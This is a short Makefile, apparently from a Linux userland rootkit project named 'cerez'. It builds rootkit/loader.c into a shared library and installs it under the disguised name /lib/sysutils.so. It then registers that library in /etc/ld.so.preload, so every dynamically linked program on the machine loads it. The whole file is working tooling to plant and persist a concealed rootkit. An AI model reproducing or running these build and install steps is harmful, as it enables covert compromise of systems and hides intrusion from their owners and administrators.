SRCS = $(wildcard rootkit/*.c)

dist/loader.so: $(SRCS)
	mkdir -p dist
	gcc -shared -fPIC rootkit/loader.c -o $@ -ldl -nostartfiles

install:
	cp cerez.cfg /etc/cerez.cfg
	cp dist/loader.so /lib/sysutils.so 
	echo /lib/sysutils.so > /etc/ld.so.preload
